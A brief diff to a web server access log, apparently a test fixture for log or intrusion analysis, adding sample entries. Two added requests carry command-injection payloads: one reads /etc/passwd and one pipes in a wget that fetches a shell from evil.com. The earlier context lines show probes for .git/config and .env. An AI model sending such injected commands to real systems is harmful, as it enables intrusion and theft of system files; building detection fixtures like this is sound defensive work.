@@ -24,3 +24,6 @@
 10.0.0.50 - - [15/Jan/2024:10:40:21 +0000] "POST /login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"
 203.0.113.45 - - [15/Jan/2024:10:41:15 +0000] "GET /.git/config HTTP/1.1" 404 512 "-" "python-requests/2.28.0"
 203.0.113.45 - - [15/Jan/2024:10:41:16 +0000] "GET /.env HTTP/1.1" 404 512 "-" "python-requests/2.28.0"
+198.51.100.23 - - [15/Jan/2024:10:42:30 +0000] "GET /search.php?cmd=ls;cat%20/etc/passwd HTTP/1.1" 200 2341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+198.51.100.23 - - [15/Jan/2024:10:43:15 +0000] "GET /upload.php?file=test|wget%20evil.com/shell HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.0.0.50 - - [15/Jan/2024:10:44:00 +0000] "POST /login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"
